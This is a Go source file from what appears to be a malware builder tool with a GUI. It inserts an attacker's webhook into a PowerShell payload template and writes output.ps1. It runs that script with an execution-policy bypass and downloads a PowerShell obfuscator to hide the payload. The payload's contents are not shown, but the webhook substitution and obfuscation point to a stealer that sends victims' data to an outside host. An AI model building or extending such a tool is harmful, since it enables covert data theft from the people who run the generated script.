package powershell

import (
	"archive/zip"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"strings"

	"builder/modules/options/utils"

	"fyne.io/fyne/v2"
)

func CompilePowershellFile(a fyne.App, webhook string, debug bool) {
	cwd, err := os.Getwd()
	if err != nil {
		fmt.Println(err)
	}
	if !(utils.TestWebhook(a, webhook)) {
		utils.MakeErrorMessage(a, "Invalid webhook!")
	}
	ps1Code := utils.GetPowershellCode()
	ps1Code = strings.Replace(ps1Code, "YOUR_WEBHOOK_HERE", webhook, -1)
	if debug {
		ps1Code = strings.Replace(ps1Code, "$debug = $false", "$debug = $true", -1)
	}
	err = os.WriteFile("output.ps1", []byte(ps1Code), 0644)
	if err != nil {
		fmt.Println(err)
	} else {
		//if obfuscate {
		//	err = obfuscateCode("output.ps1")
		//	if err != nil {
		//		utils.MakeErrorMessage(a, "An error occured while obfuscating the code"+err.Error())
		//		return
		//	}
		//}
		utils.MakeSuccessMessage(a, "Compiled ps1 file successfully! Location is at "+cwd+"\\output.ps1")
	}
}

func CompileAndTestDebugPS1(a fyne.App, webhook string) {
	CompilePowershellFile(a, webhook, true)

	// Run the compiled ps1 file
	// If the user wants to debug, they can see the output
	cmd := exec.Command("powershell", "-exec", "bypass", "-F", "output.ps1").Run()
	if cmd != nil {
		utils.MakeErrorMessage(a, "An error occured while running the compiled ps1 file: "+cmd.Error())
	}
}

func GetObfuscator() string {
	obfuscatorUrl := "https://github.com/KDot227/Somalifuscator-Powershell-Edition/archive/refs/heads/main.zip"
	// Download obfuscator
	// Unzip obfuscator
	// Return obfuscator path
	resp, err := http.Get(obfuscatorUrl)
	if err != nil {
		panic(err)
	}
	defer resp.Body.Close()

	//write the body to file
	out, err := os.Create("obfuscator.zip")
	if err != nil {
		panic(err)
	}
	defer out.Close()

	_, err = io.Copy(out, resp.Body)
	if err != nil {
		panic(err)
	}

	// Unzip obfuscator
	zipReader, err := zip.OpenReader("obfuscator.zip")
	if err != nil {
		panic(err)
	}
	defer zipReader.Close()

	for _, file := range zipReader.Reader.File {
		fileReader, err := file.Open()
		if err != nil {
			panic(err)
		}
		defer fileReader.Close()

		// Create a new file
		newFile, err := os.Create(file.Name)
		if err != nil {
			panic(err)
		}
		defer newFile.Close()

		_, err = io.Copy(newFile, fileReader)
		if err != nil {
			panic(err)
		}
	}
	return "Somalifuscator-Powershell-Edition-main"
}
